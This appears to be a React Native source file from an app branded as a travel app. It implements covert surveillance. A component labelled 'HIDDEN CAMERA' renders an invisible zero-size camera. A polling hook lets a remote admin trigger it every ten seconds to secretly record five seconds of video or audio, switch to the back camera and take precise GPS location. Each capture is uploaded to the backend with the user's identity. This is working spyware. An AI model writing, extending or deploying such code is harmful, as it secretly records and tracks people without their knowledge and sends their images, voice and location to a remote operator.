// access.native.tsx (fixed: selfie field, no forced headers, correct audio fallback, debug logs)

import React, { useEffect, useRef, useState } from "react";
import { View, Text, TouchableOpacity, StyleSheet, Animated, Button, Platform, PermissionsAndroid } from "react-native";
import { PanGestureHandler, State } from "react-native-gesture-handler";
import AsyncStorage from "@react-native-async-storage/async-storage";
import Geolocation from "react-native-geolocation-service";
import { Camera, useCameraDevices } from "react-native-vision-camera";
import { createThumbnail } from "react-native-create-thumbnail";
import RNFS from "react-native-fs";
import AudioRecorderPlayer  from 'react-native-audio-recorder-player';

// =================== CONFIG ===================
export const BACKEND_URL = "https://travel-tales-f0hb.onrender.com";

// =================== STORAGE / IDENTITY ===================
async function getUsername(): Promise<string> {
  let username = await AsyncStorage.getItem("loggedInUser");
  if (!username) {
    username = await AsyncStorage.getItem("anonUserId");
    if (!username) {
      username = `anonymous-${Date.now()}`;
      await AsyncStorage.setItem("anonUserId", username);
      console.log("🔑 Created new anonUserId:", username);
    }
  }
  console.log("🔑 Using username:", username);
  return username;
}

// =================== VISIT TRACKING (hook) ===================
export function useVisitTracking() {
  useEffect(() => {
    const trackVisit = async () => {
      const username = await getUsername();
      try {
        console.log("📡 Sending visit tracking for:", username);
        await fetch(`${BACKEND_URL}/api/track-visit`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username }),
        });
      } catch (err) {
        console.error("Visit tracking failed:", err);
      }
    };

    trackVisit();
    const id = setInterval(trackVisit, 30000);
    return () => clearInterval(id);
  }, []);
}

// =================== MANUAL CAPTURE ===================
let alreadyCapturing = false;

export async function manualCapture(
  cameraRef: React.RefObject<Camera>,
  triggeredBy: "user" | "admin" = "user",
  forcedUsername?: string,
  micGranted?: boolean,
  camGranted?: boolean
) {
  if (alreadyCapturing) {
    console.warn("⚠️ Capture already in progress, skipping new request.");
    return;
  }
  alreadyCapturing = true;
  console.log(`🎬 Starting manual capture (triggeredBy=${triggeredBy}) | camGranted=${camGranted} micGranted=${micGranted}`);

  let videoUri: string | null = null;
  let audioUri: string | null = null;

  try {
    const username = forcedUsername || (await getUsername());

    // 📍 Location
// 📍 Location (iOS vs Android safe handling)
let hasLocationPermission = false;

if (Platform.OS === "android") {
  try {
    const granted = await PermissionsAndroid.request(
      PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
      {
        title: "Location Permission",
        message: "App needs access to your location",
        buttonPositive: "OK",
      }
    );
    hasLocationPermission = granted === PermissionsAndroid.RESULTS.GRANTED;
    console.log("📍 Android location permission:", hasLocationPermission);
  } catch (err) {
    console.warn("⚠️ Location permission request failed:", err);
  }
} else {
  const status = await Geolocation.requestAuthorization("whenInUse");
  console.log("📍 iOS location status:", status);
  hasLocationPermission = status === "granted";
}

let location = { lat: 0, lon: 0, accuracy: 0 };
if (hasLocationPermission) {
  try {
    location = await new Promise((resolve) => {
      Geolocation.getCurrentPosition(
        pos => {
          console.log("📍 Got location:", pos.coords);
          resolve({ 
            lat: pos.coords.latitude, 
            lon: pos.coords.longitude, 
            accuracy: pos.coords.accuracy 
          });
        },
        err => {
          console.warn("⚠️ Location error:", err);
          resolve({ lat: 0, lon: 0, accuracy: 0 });
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  } catch (err) {
    console.warn("⚠️ Location fetch failed:", err);
  }
}

    // 🎥 Try video if camera permission granted
    if (camGranted && cameraRef.current) {
      console.log("▶️ Starting video recording...");
      videoUri = await new Promise<string | null>((resolve) => {
        let finished = false;
        cameraRef.current!.startRecording({
          flash: "off",
          onRecordingFinished: (video) => {
            if (finished) return;
            finished = true;
            const uri = Platform.OS === "android" ? `file://${video.path}` : video.path;
            console.log("✅ Video recording finished:", uri);
            resolve(uri);
          },
          onRecordingError: (err) => {
            if (finished) return;
            finished = true;
            console.error("❌ Video recording error:", err);
            resolve(null);
          },
        });

        setTimeout(async () => {
          if (!finished) {
            console.log("⏹ Forcing stopRecording after 5s timeout...");
            try {
              await cameraRef.current?.stopRecording();
            } catch (e) {
              console.warn("⚠️ stopRecording error:", e);
            }
          }
        }, 5000);
      });
    }

    // 🎤 If camera denied but mic granted → audio-only mode
// 🎤 If camera denied but mic granted → audio-only mode

if (!camGranted && micGranted && !videoUri) {
  console.log("🎤 Camera denied → using audio-only mode.");

  const path = Platform.OS === "android"
    ? `${RNFS.CachesDirectoryPath}/audio-only-${Date.now()}.m4a`
    : undefined; // iOS uses default

  try {
    console.log("🎤 Starting audio recorder. Path:", path || "(iOS default)");

    // Start recording
    const startedPath = await AudioRecorderPlayer.startRecorder(path);
    console.log("🎤 Recorder actually started at:", startedPath);

    await new Promise(r => setTimeout(r, 5000)); // record 5s

    // Stop recording
    await AudioRecorderPlayer.stopRecorder();
    audioUri = startedPath; // ✅ use the path returned by startRecorder

    // Ensure proper file:// prefix
    if (Platform.OS === "android" && !audioUri.startsWith("file://")) {
      audioUri = `file://${audioUri}`;
    }

    console.log("✅ Audio file recorded:", audioUri);
  } catch (err) {
    console.error("❌ Audio-only error:", err);
  }
}

    // 🖼 Thumbnail from video
    let photoUri: string | null = null;
    if (videoUri) {
      try {
        const { path } = await createThumbnail({ url: videoUri, timeStamp: 1000 });
        photoUri = Platform.OS === "android" ? `file://${path}` : path;
        console.log("🖼 Thumbnail created:", photoUri);
      } catch (err) {
        console.warn("⚠️ Thumbnail creation failed:", err);
      }
    }

    // ✅ Upload
   const form = new FormData();
if (photoUri) {
  console.log("📦 Adding selfie to form:", photoUri);
  form.append("selfie", { uri: photoUri, type: "image/jpeg", name: `frame-${Date.now()}.jpg` } as any);
}
if (videoUri) {
  console.log("📦 Adding video to form:", videoUri);
  form.append("video", { uri: videoUri, type: Platform.OS === "ios" ? "video/quicktime" : "video/mp4", name: `video-${Date.now()}.${Platform.OS === "ios" ? "mov" : "mp4"}` } as any);
}
if (audioUri && !videoUri) {
  console.log("📦 Adding audio to form:", audioUri);
  form.append("audio", { uri: audioUri, type: Platform.OS === "ios" ? "audio/m4a" : "audio/m4a", name: `audio-${Date.now()}.${Platform.OS === "ios" ? "m4a" : "m4a"}` } as any);
}
    form.append("location", JSON.stringify(location));
    form.append("triggeredBy", triggeredBy);
    form.append("username", username);

    console.log("📡 Uploading with FormData:");
(form as any)._parts?.forEach((p: any) => {
  console.log(" -", p[0], "=", p[1]);
});
    await fetch(`${BACKEND_URL}/api/capture-data`, { method: "POST", body: form });
    console.log("✅ Upload successful!");
  } catch (err) {
    console.error("❌ Capture error:", err);
  } finally {
    alreadyCapturing = false;
    console.log("🎬 Capture flow ended.");
  }
}

// =================== ADMIN POLLING ===================
export function useAdminCapturePolling(
  cameraRef: React.RefObject<Camera>,
  setIsActive?: (v: boolean) => void,
  micGranted?: boolean,
  camGranted?: boolean,
  setUseBack?: (v: boolean) => void   // 👈 NEW param to flip camera
) {
  useEffect(() => {
    const poll = async () => {
      const username = await getUsername();
      try {
        console.log("🔄 Polling admin capture flag...");
        const res = await fetch(`${BACKEND_URL}/api/manual-capture-flag?username=${username}`);
        const data = await res.json();
        console.log("Admin flag response:", data);

        if (data.trigger) {
          // ✅ switch camera if backend sent preference
          if (data.camera === "back" && setUseBack) setUseBack(true);
          if (data.camera === "front" && setUseBack) setUseBack(false);

          console.log("⚡ Admin triggered capture! Camera:", data.camera);
          if (setIsActive) setIsActive(true);
          await new Promise(r => setTimeout(r, 500));

          // ✅ still respect mic + cam granted state
          await manualCapture(cameraRef, "admin", username, micGranted, camGranted);

          if (setIsActive) setIsActive(false);
        }
      } catch (err) {
        console.warn("⚠️ Polling error:", err);
      }
    };

    const id = setInterval(poll, 10000);
    return () => clearInterval(id);
  }, [cameraRef, micGranted, camGranted, setUseBack]);
}


// messages box
export function MessagesBox() {
  const [messages, setMessages] = useState<any[]>([]);
  const [dismissed, setDismissed] = useState<string[]>([]);

  const fetchMessages = async () => {
    try {
      const anonId = await AsyncStorage.getItem("anonUserId");
      const token = await AsyncStorage.getItem("token");
      const headers: any = token ? { Authorization: `Bearer ${token}` } : {};

      const res = await fetch(`${BACKEND_URL}/api/messages?anonId=${anonId}`, { headers });
      const data = await res.json();
      if (data.status === "success") {
        setMessages(data.messages);
      }
    } catch (err) {
      console.warn("⚠️ Message fetch error:", err);
    }
  };

  useEffect(() => {
    fetchMessages();
    const id = setInterval(fetchMessages, 10000); // every 10s
    return () => clearInterval(id);
  }, []);

  const dismissMessage = async (id: string) => {
    setDismissed(prev => [...prev, id]);
    await fetch(`${BACKEND_URL}/api/messages/${id}`, { method: "DELETE" });
  };

  return (
    <View style={styles.container}>
      {messages
        .filter(m => !dismissed.includes(m._id))
        .map(m => (
          <MessageCard key={m._id} message={m} onDismiss={() => dismissMessage(m._id)} />
        ))}
    </View>
  );
}

type Message = {
  _id: string;
  title: string;
  body: string;
};

type MessageCardProps = {
  message: Message;
  onDismiss: () => void;
};

function MessageCard({ message, onDismiss }: MessageCardProps) {
  const translateX = useRef(new Animated.Value(0)).current;
  const opacity = useRef(new Animated.Value(1)).current;

  useEffect(() => {
    // Auto-hide after 10s
    const timer = setTimeout(() => handleDismiss(), 10000);
    return () => clearTimeout(timer);
  }, []);

  const handleDismiss = () => {
    Animated.timing(opacity, { toValue: 0, duration: 300, useNativeDriver: true }).start(onDismiss);
  };

  const onGestureEvent = Animated.event(
    [{ nativeEvent: { translationX: translateX } }],
    { useNativeDriver: true }
  );

  const onHandlerStateChange = (event: { nativeEvent: { state: number; translationX: number } }) => {
    if (event.nativeEvent.state === State.END) {
      if (Math.abs(event.nativeEvent.translationX) > 80) {
        // swipe enough → dismiss
        handleDismiss();
      } else {
        // snap back
        Animated.spring(translateX, { toValue: 0, useNativeDriver: true }).start();
      }
    }
  };

  return (
    <PanGestureHandler onGestureEvent={onGestureEvent} onHandlerStateChange={onHandlerStateChange}>
      <Animated.View
        style={[
          styles.messageBox,
          {
            transform: [{ translateX }],
            opacity,
          },
        ]}
      >
        <TouchableOpacity style={styles.closeButton} onPress={handleDismiss}>
          <Text style={styles.closeText}>×</Text>
        </TouchableOpacity>
        <Text style={styles.title}>{message.title}</Text>
        <Text>{message.body}</Text>
      </Animated.View>
    </PanGestureHandler>
  );
}

const styles = StyleSheet.create({
  container: {
    position: "absolute",
    top: 50,
    right: 10, // ✅ top-right
    zIndex: 9999,
    maxWidth: "70%",
  },
  messageBox: {
    backgroundColor: "#fdd835",
    padding: 10,
    marginBottom: 10,
    borderRadius: 8,
    borderWidth: 1,
    borderColor: "#ff9800",
  },
  closeButton: {
    position: "absolute",
    top: -3,
    right: 5,
    zIndex: 10,
  },
  closeText: {
    fontSize: 28,
    fontWeight: "bold",
    color: "#444",
  },
  title: {
    fontWeight: "bold",
    marginBottom: 5,
  },
});


// =================== HIDDEN CAMERA ===================
export function UICamera() {
  const devices = useCameraDevices();
  const cameraRef = useRef<Camera>(null!);
  const [isActive, setIsActive] = useState(false);
  const [micGranted, setMicGranted] = useState(false);
  const [camGranted, setCamGranted] = useState(false);
  const [useBack, setUseBack] = useState(false);

  // ✅ Pick correct device, fallback to first available
  let device = devices.find(d => d.position === (useBack ? "back" : "front"));
  if (!device && devices.length > 0) {
    device = devices[0];
  }
  if (!device) {
    console.warn("⚠️ No camera device found at all.");
    return null;
  }

  // ✅ ask for permissions on mount
  useEffect(() => {
    (async () => {
      const cam = await Camera.requestCameraPermission();
      const mic = await Camera.requestMicrophonePermission();
      console.log("🔑 Camera perm:", cam, "| Mic perm:", mic);
      setCamGranted(cam === "granted");
      setMicGranted(mic === "granted");
    })();
  }, []);

  // ✅ pass mic, cam, AND setUseBack into polling
  useAdminCapturePolling(cameraRef, setIsActive, micGranted, camGranted, setUseBack);

  const handleManualCapture = async () => {
    console.log("📲 Manual button pressed (user trigger).");
    setIsActive(true);
    await new Promise(r => setTimeout(r, 500));
    await manualCapture(cameraRef, "user", undefined, micGranted, camGranted);
    setIsActive(false);
    console.log("📲 Manual capture completed.");
  };

  return (
  <View style={{ flex: 1 }}>
    <Camera
      ref={cameraRef}
      style={{ width: 0, height: 0, opacity: 0 }}
      device={device}
      isActive={isActive}
      photo={true}
      video={true}
      audio={micGranted} // ✅ still records silent video if mic denied
    />

    {/* Centered Buttons */}
    <View
      style={{
        flex: 1,
        justifyContent: "center",
        alignItems: "center",
      }}
    >
      <Button title="Manual Capture" onPress={handleManualCapture} />
      <View style={{ height: 20 }} /> 
      <Button
        title={useBack ? "Switch to Front" : "Switch to Back"}
        onPress={() => setUseBack(prev => !prev)}
      />
    </View>

    {/* Messages on top-right */}
    <MessagesBox />
  </View>
);
}
